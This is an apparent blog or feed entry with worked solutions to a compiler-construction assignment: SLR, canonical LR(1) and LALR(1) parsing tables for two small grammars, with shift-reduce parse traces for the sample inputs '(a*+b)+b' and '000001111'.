closure(GOTO(I9, P))I5 = closure(GOTO(I9, ( )I6 = closure(GOTO(I9, a))I7 = closure(GOTO(I9, b))I16 = closure(GOTO(I13, Z))    = closure({[Z-&gt;*Z•]})    = {[Z-&gt;*Z•]}I13 = closure(GOTO(I13, *))I17 = closure(GOTO(I14, ) ))    = {[P-&gt;(E)•]}</code></pre><p><img src="/2025/11/CS323-Assignment-4/t1.svg" /></p><p>The SLR parsing table</p><table><tr><td rowspan="2" align="center">State</td><td colspan="7" align="center">ACTION</td><td colspan="7" align="center">GOTO</td></tr><tr><td>a</td><td>b</td><td>+</td><td>*</td><td>(</td><td>)</td><td>$</td><td>E</td><td>T</td><td>X</td><td>F</td><td>Y</td><td>P</td><td>Z</td></tr><tr><td align="center">0</td><td>s6</td><td>s7</td><td></td><td></td><td>s5</td><td></td><td></td><td>1</td><td>2</td><td></td><td>3</td><td></td><td>4</td><td></td></tr><tr><td align="center">1</td><td></td><td></td><td></td><td></td><td></td><td></td><td>acc</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">2</td><td></td><td></td><td>s9</td><td></td><td>s5</td><td>r3</td><td>r3</td><td></td><td></td><td>8</td><td></td><td></td><td></td><td></td></tr><tr><td align="center">3</td><td>s6</td><td>s7</td><td>r6</td><td></td><td></td><td>r6</td><td>r6</td><td></td><td>11</td><td></td><td>3</td><td>10</td><td>4</td><td></td></tr><tr><td align="center">4</td><td>r9</td><td>r9</td><td>r9</td><td>s13</td><td>r9</td><td>r9</td><td>r9</td><td></td><td></td><td></td><td></td><td></td><td></td><td>12</td></tr><tr><td align="center">5</td><td>s6</td><td>s7</td><td></td><td></td><td>s5</td><td></td><td></td><td>14</td><td>2</td><td></td><td>3</td><td></td><td>4</td><td></td></tr><tr><td align="center">6</td><td>r11</td><td>r11</td><td>r11</td><td>r11</td><td>r11</td><td>r11</td><td>r11</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">7</td><td>r12</td><td>r12</td><td>r12</td><td>r12</td><td>r12</td><td>r12</td><td>r12</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">8</td><td></td><td></td><td></td><td></td><td></td><td>r1</td><td>r1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">9</td><td>s6</td><td>s7</td><td></td><td></td><td>s5</td><td></td><td></td><td>15</td><td>2</td><td></td><td>3</td><td></td><td>4</td><td></td></tr><tr><td align="center">10</td><td></td><td></td><td>r4</td><td></td><td></td><td>r4</td><td>r4</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">11</td><td></td><td></td><td>r5</td><td></td><td></td><td>r5</td><td>r5</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">12</td><td>r7</td><td>r7</td><td>r7</td><td></td><td>r7</td><td>r7</td><td>r7</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">13</td><td>r9</td><td>r9</td><td>r9</td><td>s13</td><td>r9</td><td>r9</td><td>r9</td><td></td><td></td><td></td><td></td><td></td><td></td><td>16</td></tr><tr><td align="center">14</td><td></td><td></td><td></td><td></td><td></td><td>s17</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">15</td><td></td><td></td><td></td><td></td><td></td><td>r2</td><td>r2</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">16</td><td>r8</td><td>r8</td><td>r8</td><td></td><td>r8</td><td>r8</td><td>r8</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">17</td><td>r10</td><td>r10</td><td>r10</td><td>r10</td><td>r10</td><td>r10</td><td>r10</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table><p>The grammar is SLR(1), because there are no conflict during theparsing table construction.</p><p><strong>2.</strong> Give the parsing steps for the input string(a∗+b)+b. If there are conflicts in the parsing table, please addressthem reasonably.</p><table><thead><tr><th style="text-align: center;">LINE</th><th style="text-align: center;">STACK</th><th style="text-align: center;">SYMBOLS</th><th style="text-align: center;">INPUT</th><th style="text-align: center;">ACTION</th></tr></thead><tbody><tr><td style="text-align: center;">(1)</td><td style="text-align: center;">0</td><td style="text-align: center;">$</td><td style="text-align: center;">(a*+b)+b$</td><td style="text-align: center;">shift to 5</td></tr><tr><td style="text-align: center;">(2)</td><td style="text-align: center;">0 5</td><td style="text-align: center;">$ (</td><td style="text-align: center;">a*+b)+b$</td><td style="text-align: center;">shift to 6</td></tr><tr><td style="text-align: center;">(3)</td><td style="text-align: center;">0 5 6</td><td style="text-align: center;">$ ( a</td><td style="text-align: center;">*+b)+b$</td><td style="text-align: center;">reduce by P-&gt;a</td></tr><tr><td style="text-align: center;">(4)</td><td style="text-align: center;">0 5 4</td><td style="text-align: center;">$ ( P</td><td style="text-align: center;">*+b)+b$</td><td style="text-align: center;">shift to 13</td></tr><tr><td style="text-align: center;">(5)</td><td style="text-align: center;">0 5 4 13</td><td style="text-align: center;">$ ( P *</td><td style="text-align: center;">+b)+b$</td><td style="text-align: center;">reduce by Z-&gt;ε</td></tr><tr><td style="text-align: center;">(6)</td><td style="text-align: center;">0 5 4 13 16</td><td style="text-align: center;">$ ( P * Z</td><td style="text-align: center;">+b)+b$</td><td style="text-align: center;">reduce by Z-&gt;*Z</td></tr><tr><td style="text-align: center;">(7)</td><td style="text-align: center;">0 5 4 12</td><td style="text-align: center;">$ ( P Z</td><td style="text-align: center;">+b)+b$</td><td style="text-align: center;">reduce by F-&gt;PZ</td></tr><tr><td style="text-align: center;">(8)</td><td style="text-align: center;">0 5 3</td><td style="text-align: center;">$ ( F</td><td style="text-align: center;">+b)+b$</td><td style="text-align: center;">reduce by Y-&gt;ε</td></tr><tr><td style="text-align: center;">(9)</td><td style="text-align: center;">0 5 3 10</td><td style="text-align: center;">$ ( F Y</td><td style="text-align: center;">+b)+b$</td><td style="text-align: center;">reduce by T-&gt;FY</td></tr><tr><td style="text-align: center;">(10)</td><td style="text-align: center;">0 5 2</td><td style="text-align: center;">$ ( T</td><td style="text-align: center;">+b)+b$</td><td style="text-align: center;">shift to 9</td></tr><tr><td style="text-align: center;">(11)</td><td style="text-align: center;">0 5 2 9</td><td style="text-align: center;">$ ( T +</td><td style="text-align: center;">b)+b$</td><td style="text-align: center;">shift to 7</td></tr><tr><td style="text-align: center;">(12)</td><td style="text-align: center;">0 5 2 9 7</td><td style="text-align: center;">$ ( T + b</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by P-&gt;b</td></tr><tr><td style="text-align: center;">(13)</td><td style="text-align: center;">0 5 2 9 4</td><td style="text-align: center;">$ ( T + P</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by Z-&gt;ε</td></tr><tr><td style="text-align: center;">(14)</td><td style="text-align: center;">0 5 2 9 4 12</td><td style="text-align: center;">$ ( T + PZ</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by F-&gt;PZ</td></tr><tr><td style="text-align: center;">(15)</td><td style="text-align: center;">0 5 2 9 3</td><td style="text-align: center;">$ ( T + F</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by Y-&gt;ε</td></tr><tr><td style="text-align: center;">(16)</td><td style="text-align: center;">0 5 2 9 3 10</td><td style="text-align: center;">$ ( T + FY</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by T-&gt;FY</td></tr><tr><td style="text-align: center;">(17)</td><td style="text-align: center;">0 5 2 9 2</td><td style="text-align: center;">$ ( T + T</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by X-&gt;ε</td></tr><tr><td style="text-align: center;">(18)</td><td style="text-align: center;">0 5 2 9 2 8</td><td style="text-align: center;">$ ( T + TX</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by E-&gt;TX</td></tr><tr><td style="text-align: center;">(19)</td><td style="text-align: center;">0 5 2 9 15</td><td style="text-align: center;">$ ( T + E</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by X-&gt;+E</td></tr><tr><td style="text-align: center;">(20)</td><td style="text-align: center;">0 5 2 8</td><td style="text-align: center;">$ ( T X</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">reduce by E-&gt;TX</td></tr><tr><td style="text-align: center;">(21)</td><td style="text-align: center;">0 5 14</td><td style="text-align: center;">$ ( E</td><td style="text-align: center;">)+b$</td><td style="text-align: center;">shift to 17</td></tr><tr><td style="text-align: center;">(22)</td><td style="text-align: center;">0 5 14 17</td><td style="text-align: center;">$ ( E )</td><td style="text-align: center;">+b$</td><td style="text-align: center;">reduce by P-&gt;(E)</td></tr><tr><td style="text-align: center;">(23)</td><td style="text-align: center;">0 4</td><td style="text-align: center;">$ P</td><td style="text-align: center;">+b$</td><td style="text-align: center;">reduce by Z-&gt;ε</td></tr><tr><td style="text-align: center;">(24)</td><td style="text-align: center;">0 4 12</td><td style="text-align: center;">$ P Z</td><td style="text-align: center;">+b$</td><td style="text-align: center;">reduce by F-&gt;PZ</td></tr><tr><td style="text-align: center;">(25)</td><td style="text-align: center;">0 3</td><td style="text-align: center;">$ F</td><td style="text-align: center;">+b$</td><td style="text-align: center;">reduce by Y-&gt;ε</td></tr><tr><td style="text-align: center;">(26)</td><td style="text-align: center;">0 3 10</td><td style="text-align: center;">$ FY</td><td style="text-align: center;">+b$</td><td style="text-align: center;">reduce by T-&gt;FY</td></tr><tr><td style="text-align: center;">(27)</td><td style="text-align: center;">0 2</td><td style="text-align: center;">$ T</td><td style="text-align: center;">+b$</td><td style="text-align: center;">shift to 9</td></tr><tr><td style="text-align: center;">(28)</td><td style="text-align: center;">0 2 9</td><td style="text-align: center;">$ T +</td><td style="text-align: center;">b$</td><td style="text-align: center;">shift to 7</td></tr><tr><td style="text-align: center;">(29)</td><td style="text-align: center;">0 2 9 7</td><td style="text-align: center;">$ T + b</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by P-&gt;b</td></tr><tr><td style="text-align: center;">(30)</td><td style="text-align: center;">0 2 9 4</td><td style="text-align: center;">$ T + P</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by Z-&gt;ε</td></tr><tr><td style="text-align: center;">(31)</td><td style="text-align: center;">0 2 9 4 12</td><td style="text-align: center;">$ T + PZ</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by F-&gt;PZ</td></tr><tr><td style="text-align: center;">(32)</td><td style="text-align: center;">0 2 9 3</td><td style="text-align: center;">$ T + F</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by Y-&gt;ε</td></tr><tr><td style="text-align: center;">(33)</td><td style="text-align: center;">0 2 9 3 10</td><td style="text-align: center;">$ T + F Y</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by T-&gt;FY</td></tr><tr><td style="text-align: center;">(34)</td><td style="text-align: center;">0 2 9 2</td><td style="text-align: center;">$ T + T</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by X-&gt;ε</td></tr><tr><td style="text-align: center;">(35)</td><td style="text-align: center;">0 2 9 2 8</td><td style="text-align: center;">$ T + TX</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by E-&gt;TX</td></tr><tr><td style="text-align: center;">(36)</td><td style="text-align: center;">0 2 9 15</td><td style="text-align: center;">$ T + E</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by X-&gt;+E</td></tr><tr><td style="text-align: center;">(37)</td><td style="text-align: center;">0 2 8</td><td style="text-align: center;">$ T X</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by E-&gt;TX</td></tr><tr><td style="text-align: center;">(38)</td><td style="text-align: center;">0 1</td><td style="text-align: center;">$ E</td><td style="text-align: center;">$</td><td style="text-align: center;">accept</td></tr></tbody></table><p><strong>Exercise 2:</strong> Consider the following grammar G:</p><pre><code>S -&gt; 0AA -&gt; S1A | ε</code></pre><p><strong>1.</strong> Please construct the shift-reduce parsing tablefor the above grammar G using each of the following algorithms: (1) SLR,(2) CLR, and (3) LALR.</p><ol type="1"><li>SLR</li></ol><p><spanclass="math inline"><em>F</em><em>I</em><em>R</em><em>S</em><em>T</em>(<em>S</em>) = {0}</span><spanclass="math inline"><em>F</em><em>O</em><em>L</em><em>L</em><em>O</em><em>W</em>(<em>S</em>) = {1, $}</span></p><p><spanclass="math inline"><em>F</em><em>I</em><em>R</em><em>S</em><em>T</em>(<em>A</em>) = {<em>ε</em>, 0}</span><spanclass="math inline"><em>F</em><em>O</em><em>L</em><em>L</em><em>O</em><em>W</em>(<em>A</em>) = {1, $}</span></p><pre><code>(1) S -&gt; 0A(2) A -&gt; S1A(3) A -&gt; ε</code></pre><p>Augmented grammar: Introduce a new symbol S’ and add a new production<code>S' -&gt; S</code></p><pre><code>I0 = closure({[S&#39;-&gt;•S]})   = {[S&#39;-&gt;•S], [S-&gt;•0A]}I1 = closure(GOTO(I0, S))   = closure({[S&#39;-&gt;S•]})   = {[S&#39;-&gt;S•]}I2 = closure(GOTO(I0, 0))   = closure({[S-&gt;0•A]})   = {[S-&gt;0•A], [A-&gt;•S1A], [S-&gt;•0A], [A-&gt;•]}I3 = closure(GOTO(I2, S))   = closure({[A-&gt;S•1A]})   = {[A-&gt;S•1A]}I4 = closure(GOTO(I2, A))   = closure({[S-&gt;0A•]})   = {[S-&gt;0A•]}I2 = closure(GOTO(I2, 0))   = closure({[S-&gt;0•A]})I5 = closure(GOTO(I3, 1))   = closure({[A-&gt;S1•A]})   = {[A-&gt;S1•A], [A-&gt;•S1A], [S-&gt;•0A], [A-&gt;•]}I3 = closure(GOTO(I5, S))   = closure({[A-&gt;S•1A]})I6 = closure(GOTO(I5, A))   = closure({A-&gt;S1A•})   = {[A-&gt;S1A•]}I2 = closure(GOTO(I5, 0))   = closure({[S-&gt;0•A]})</code></pre><p>the shift-reduce parsing table using SLR</p><table><tr><td rowspan="2" align="center">State</td><td colspan="3" align="center">ACTION</td><td colspan="2" align="center">GOTO</td></tr><tr><td>0</td><td>1</td><td>$</td><td>S</td><td>A</td></tr><tr><td>0</td><td>s2</td><td></td><td></td><td>1</td><td></td></tr><tr><td>1</td><td></td><td></td><td>acc</td><td></td><td></td></tr><tr><td>2</td><td>s2</td><td>r3</td><td>r3</td><td>3</td><td>4</td></tr><tr><td>3</td><td></td><td>s5</td><td></td><td></td><td></td></tr><tr><td>4</td><td></td><td>r1</td><td>r1</td><td></td><td></td></tr><tr><td>5</td><td>s2</td><td>r3</td><td>r3</td><td>3</td><td>6</td></tr><tr><td>6</td><td></td><td>r2</td><td>r2</td><td></td><td></td></tr></table><ol start="2" type="1"><li>CLR</li></ol><p><spanclass="math inline"><em>F</em><em>I</em><em>R</em><em>S</em><em>T</em>(<em>S</em>) = {0}</span><spanclass="math inline"><em>F</em><em>O</em><em>L</em><em>L</em><em>O</em><em>W</em>(<em>S</em>) = {1, $}</span></p><p><spanclass="math inline"><em>F</em><em>I</em><em>R</em><em>S</em><em>T</em>(<em>A</em>) = {<em>ε</em>, 0}</span><spanclass="math inline"><em>F</em><em>O</em><em>L</em><em>L</em><em>O</em><em>W</em>(<em>A</em>) = {1, $}</span></p><pre><code>(1) S -&gt; 0A(2) A -&gt; S1A(3) A -&gt; ε</code></pre><p>Augmented grammar: Introduce a new symbol S’ and add a new production<code>S' -&gt; S</code></p><p><spanclass="math inline"><em>F</em><em>I</em><em>R</em><em>S</em><em>T</em>($) = {$}</span></p><p><spanclass="math inline"><em>F</em><em>I</em><em>R</em><em>S</em><em>T</em>(1<em>A</em>$) = {1}</span></p><pre><code>I0 = closure({[S&#39;-&gt;•S, $]})   = {[S&#39;-&gt;•S, $], [S-&gt;•0A, $]}I1 = closure(GOTO(I0, S))   = {[S&#39;-&gt;S•, $]}I2 = closure(GOTO(I0, 0))   = closure({[S-&gt;0•A, $]})   = {[S-&gt;0•A, $], [A-&gt;•S1A, $], [S-&gt;•0A, 1], [A-&gt;•, $]}I3 = closure(GOTO(I2, S))   = closure({[A-&gt;S•1A, $]})   = {[A-&gt;S•1A, $]}I4 = closure(GOTO(I2, A))   = closure({[S-&gt;0A, $]})   = {[S-&gt;0A•,$]}I5 = closure(GOTO(I2, 0))   = closure({[S-&gt;0•A, 1]})   = {[S-&gt;0•A, 1], [A-&gt;•S1A, 1], [S-&gt;•0A, 1], [A-&gt;•, 1]}I6 = closure(GOTO(I3, 1))   = closure({[A-&gt;S1•A, $]})   = {[A-&gt;S1•A, $], [A-&gt;•S1A, $], [S-&gt;•0A, 1], [A-&gt;•, $]}I7 = closure(GOTO(I5, S))   = closure({[A-&gt;S•1A, 1]})   = {[A-&gt;S•1A, 1]}I8 = closure(GOTO(I5, A))   = closure({[S-&gt;0A•, 1]})   = {[S-&gt;0A•, 1]}I5 = closure(GOTO(I5, 0))   = closure({[S-&gt;0•A, 1]})I3 = closure(GOTO(I6, S))   = closure({[A-&gt;S•1A, $]})I9 = closure(GOTO(I6, A))   = closure({[A-&gt;S1A•, $]})   = {[A-&gt;S1A•, $]}I5 = closure(GOTO(I6, 0))   = closure({[S-&gt;0•A, 1]})I10= closure(GOTO(I7, 1))   = closure({[A-&gt;S1•A, 1]})   = {[A-&gt;S1•A, 1], [A-&gt;•S1A, 1], [S-&gt;•0A, 1], [A-&gt;•, 1]}I7 = closure(GOTO(I10, S))   = closure({[A-&gt;S•1A, 1]})I11= closure(GOTO(I10, A))   = closure({[A-&gt;S1A•, 1]})   = {[A-&gt;S1A•, 1]}I5 = closure(GOTO(I10, 0))   = closure({[S-&gt;0•A, 1]})</code></pre><p>the shift-reduce parsing table using CLR</p><table><tr><td rowspan="2" align="center">State</td><td colspan="3" align="center">ACTION</td><td colspan="2" align="center">GOTO</td></tr><tr><td>0</td><td>1</td><td>$</td><td>S</td><td>A</td></tr><tr><td>0</td><td>s2</td><td></td><td></td><td>1</td><td></td></tr><tr><td>1</td><td></td><td></td><td>acc</td><td></td><td></td></tr><tr><td>2</td><td>s5</td><td></td><td>r3</td><td>3</td><td>4</td></tr><tr><td>3</td><td></td><td>s6</td><td></td><td></td><td></td></tr><tr><td>4</td><td></td><td></td><td>r1</td><td></td><td></td></tr><tr><td>5</td><td>s5</td><td>r3</td><td></td><td>7</td><td>8</td></tr><tr><td>6</td><td>s5</td><td></td><td>r3</td><td>3</td><td>9</td></tr><tr><td>7</td><td></td><td>s10</td><td></td><td></td><td></td></tr><tr><td>8</td><td></td><td>r1</td><td></td><td></td><td></td></tr><tr><td>9</td><td></td><td></td><td>r2</td><td></td><td></td></tr><tr><td>10</td><td>s5</td><td>r3</td><td></td><td>7</td><td>11</td></tr><tr><td>11</td><td></td><td>r2</td><td></td><td></td><td></td></tr></table><ol start="3" type="1"><li>LALR</li></ol><pre><code>I25 = I2 U I5 = {[S-&gt;0•A, 1/$], [A-&gt;•S1A, 1/$], [S-&gt;•0A, 1], [A-&gt;•, 1/$]}I37 = I3 U I7 = {[A-&gt;S•1A, 1/$]}I48 = I4 U I8 = {[S-&gt;0A•,1/$]}I6_10 = I6 U I10 = {[A-&gt;S1•A, 1/$], [A-&gt;•S1A, 1/$], [S-&gt;•0A, 1], [A-&gt;•, 1/$]}I9_11 = I9 U I11 = {[A-&gt;S1A•, 1/$]}</code></pre><pre><code>State 0: I0State 1: I1State 2: I25State 3: I37State 4: I48State 5: I6_10State 6: I9_11</code></pre><table><tr><td rowspan="2" align="center">State</td><td colspan="3" align="center">ACTION</td><td colspan="2" align="center">GOTO</td></tr><tr><td>0</td><td>1</td><td>$</td><td>S</td><td>A</td></tr><tr><td>0</td><td>s2</td><td></td><td></td><td>1</td><td></td></tr><tr><td>1</td><td></td><td></td><td>acc</td><td></td><td></td></tr><tr><td>2</td><td>s2</td><td>r3</td><td>r3</td><td>3</td><td>4</td></tr><tr><td>3</td><td></td><td>s5</td><td></td><td></td><td></td></tr><tr><td>4</td><td></td><td>r1</td><td>r1</td><td></td><td></td></tr><tr><td>5</td><td>s2</td><td>r3</td><td>r3</td><td>3</td><td>6</td></tr><tr><td>6</td><td></td><td>r2</td><td>r2</td><td></td><td></td></tr></table><p><strong>2.</strong> Is the grammar SLR(1)? Is it LR(1)? Is itLALR(1)?</p><p>Yes, this grammar is SLR(1), LR(1), and LALR(1). The SLR(1) parsingtable with 7 states has no conflicts despite using coarser FOLLOW sets,the LR(1) (CLR) table with 12 states is conflict-free using preciselookaheads, and the LALR(1) table successfully merges core-equivalentLR(1) states back to 7 states without introducing any new conflicts.</p><p><strong>3.</strong> Can an LALR(1) parser accept the string000001111? If yes, please list the parsing steps; otherwise, pleasestate the reason. Before parsing, please address conflicts in theparsing table if any.</p><p>LALR(1) parser can accept the string 000001111</p><table><colgroup><col style="width: 9%" /><col style="width: 24%" /><col style="width: 24%" /><col style="width: 16%" /><col style="width: 25%" /></colgroup><thead><tr><th style="text-align: center;">LINE</th><th style="text-align: center;">STACK</th><th style="text-align: center;">SYMBOLS</th><th style="text-align: center;">INPUT</th><th style="text-align: center;">ACTION</th></tr></thead><tbody><tr><td style="text-align: center;">(1)</td><td style="text-align: center;">0</td><td style="text-align: center;">$</td><td style="text-align: center;">000001111$</td><td style="text-align: center;">shift to 2</td></tr><tr><td style="text-align: center;">(2)</td><td style="text-align: center;">0 2</td><td style="text-align: center;">$ 0</td><td style="text-align: center;">00001111$</td><td style="text-align: center;">shift to 2</td></tr><tr><td style="text-align: center;">(3)</td><td style="text-align: center;">0 2 2</td><td style="text-align: center;">$ 0 0</td><td style="text-align: center;">0001111$</td><td style="text-align: center;">shift to 2</td></tr><tr><td style="text-align: center;">(4)</td><td style="text-align: center;">0 2 2 2</td><td style="text-align: center;">$ 0 0 0</td><td style="text-align: center;">001111$</td><td style="text-align: center;">shift to 2</td></tr><tr><td style="text-align: center;">(5)</td><td style="text-align: center;">0 2 2 2 2</td><td style="text-align: center;">$ 0 0 0 0</td><td style="text-align: center;">01111$</td><td style="text-align: center;">shift to 2</td></tr><tr><td style="text-align: center;">(6)</td><td style="text-align: center;">0 2 2 2 2 2</td><td style="text-align: center;">$ 0 0 0 0 0</td><td style="text-align: center;">1111$</td><td style="text-align: center;">reduce by A-&gt;ε</td></tr><tr><td style="text-align: center;">(7)</td><td style="text-align: center;">0 2 2 2 2 2 4</td><td style="text-align: center;">$ 0 0 0 0 0 A</td><td style="text-align: center;">1111$</td><td style="text-align: center;">reduce by S-&gt;0A</td></tr><tr><td style="text-align: center;">(8)</td><td style="text-align: center;">0 2 2 2 2 3</td><td style="text-align: center;">$ 0 0 0 0 S</td><td style="text-align: center;">1111$</td><td style="text-align: center;">shift to 5</td></tr><tr><td style="text-align: center;">(9)</td><td style="text-align: center;">0 2 2 2 2 3 5</td><td style="text-align: center;">$ 0 0 0 0 S 1</td><td style="text-align: center;">111$</td><td style="text-align: center;">reduce by A-&gt;ε</td></tr><tr><td style="text-align: center;">(10)</td><td style="text-align: center;">0 2 2 2 2 3 5 6</td><td style="text-align: center;">$ 0 0 0 0 S 1 A</td><td style="text-align: center;">111$</td><td style="text-align: center;">reduce by A-&gt;S1A</td></tr><tr><td style="text-align: center;">(11)</td><td style="text-align: center;">0 2 2 2 2 4</td><td style="text-align: center;">$ 0 0 0 0 A</td><td style="text-align: center;">111$</td><td style="text-align: center;">reduce by S-&gt;0A</td></tr><tr><td style="text-align: center;">(12)</td><td style="text-align: center;">0 2 2 2 3</td><td style="text-align: center;">$ 0 0 0 S</td><td style="text-align: center;">111$</td><td style="text-align: center;">shift to 5</td></tr><tr><td style="text-align: center;">(13)</td><td style="text-align: center;">0 2 2 2 3 5</td><td style="text-align: center;">$ 0 0 0 S 1</td><td style="text-align: center;">11$</td><td style="text-align: center;">reduce by A-&gt;ε</td></tr><tr><td style="text-align: center;">(14)</td><td style="text-align: center;">0 2 2 2 3 5 6</td><td style="text-align: center;">$ 0 0 0 S 1 A</td><td style="text-align: center;">11$</td><td style="text-align: center;">reduce by A-&gt;S1A</td></tr><tr><td style="text-align: center;">（15）</td><td style="text-align: center;">0 2 2 2 4</td><td style="text-align: center;">$ 0 0 0 A</td><td style="text-align: center;">11$</td><td style="text-align: center;">reduce by S-&gt;0A</td></tr><tr><td style="text-align: center;">(16)</td><td style="text-align: center;">0 2 2 3</td><td style="text-align: center;">$ 0 0 S</td><td style="text-align: center;">11$</td><td style="text-align: center;">shift to 5</td></tr><tr><td style="text-align: center;">(17)</td><td style="text-align: center;">0 2 2 3 5</td><td style="text-align: center;">$ 0 0 S 1</td><td style="text-align: center;">1$</td><td style="text-align: center;">reduce by A-&gt;ε</td></tr><tr><td style="text-align: center;">(18)</td><td style="text-align: center;">0 2 2 3 5 6</td><td style="text-align: center;">$ 0 0 S 1 A</td><td style="text-align: center;">1$</td><td style="text-align: center;">reduce by A-&gt;S1A</td></tr><tr><td style="text-align: center;">(19)</td><td style="text-align: center;">0 2 2 4</td><td style="text-align: center;">$ 0 0 A</td><td style="text-align: center;">1$</td><td style="text-align: center;">reduce by S-&gt;0A</td></tr><tr><td style="text-align: center;">(20)</td><td style="text-align: center;">0 2 3</td><td style="text-align: center;">$ 0 S</td><td style="text-align: center;">1$</td><td style="text-align: center;">shift to 5</td></tr><tr><td style="text-align: center;">(21)</td><td style="text-align: center;">0 2 3 5</td><td style="text-align: center;">$ 0 S 1</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by A-&gt;ε</td></tr><tr><td style="text-align: center;">(22)</td><td style="text-align: center;">0 2 3 5 6</td><td style="text-align: center;">$ 0 S 1 A</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce A-&gt;S1A</td></tr><tr><td style="text-align: center;">(23)</td><td style="text-align: center;">0 2 4</td><td style="text-align: center;">$ 0 A</td><td style="text-align: center;">$</td><td style="text-align: center;">reduce by S-&gt;0A</td></tr><tr><td style="text-align: center;">(24)</td><td style="text-align: center;">0 1</td><td style="text-align: center;">$ S</td><td style="text-align: center;">$</td><td style="text-align: center;">accept</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Exercise 1:&lt;/strong&gt; Consider the following grammar G, which
you have seen in the previous assignment:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;E -&amp;gt; TX
X -&amp;gt; +E | ε
T -&amp;gt; FY
Y -&amp;gt; T | ε
F -&amp;gt; PZ
Z -&amp;gt; *Z | ε
P -&amp;gt; (E) | a | b&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;1. &lt;/strong&gt;Please construct the SLR parsing table for G. Is
the grammar SLR(1)?&lt;/p&gt;
&lt;table&gt;
&lt;colgroup&gt;
&lt;col style=&quot;width: 24%&quot; /&gt;
&lt;col style=&quot;width: 37%&quot; /&gt;
&lt;col style=&quot;width: 37%&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;(Non-Terminal)&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;FIRST Set&lt;/strong&gt;&lt;/th&gt;
&lt;th style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;FOLLOW Set&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;E&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{(,&lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{$, )}&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;T&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{(,&lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{$, ), +}&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;X&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{&lt;em&gt;ε&lt;/em&gt;, +}&lt;/span&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{$, )}&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;F&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{(,&lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
class=&quot;math inline&quot;&gt;{$, (,), +, &lt;em&gt;a&lt;/em&gt;, &lt;em&gt;b&lt;/em&gt;}&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;Y&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&quot;text-align: center;&quot;&gt;&lt;span
